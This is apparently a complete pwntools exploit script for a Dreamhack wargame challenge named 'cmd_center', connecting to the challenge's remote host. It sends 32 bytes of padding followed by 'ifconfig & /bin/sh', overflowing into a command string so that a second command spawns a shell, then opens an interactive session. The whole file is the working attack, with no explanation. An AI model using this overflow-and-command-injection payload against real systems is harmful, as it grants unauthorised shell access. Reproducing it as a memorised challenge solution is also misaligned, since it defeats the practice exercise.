from pwn import *

exe = ELF('./cmd_center', checksec=False)
# p = process(exe.path)
p = remote("host1.dreamhack.games", 10948)

payload = b'a'*32 + b'ifconfig & /bin/sh'
p.sendafter(b'name: ', payload)

p.interactive()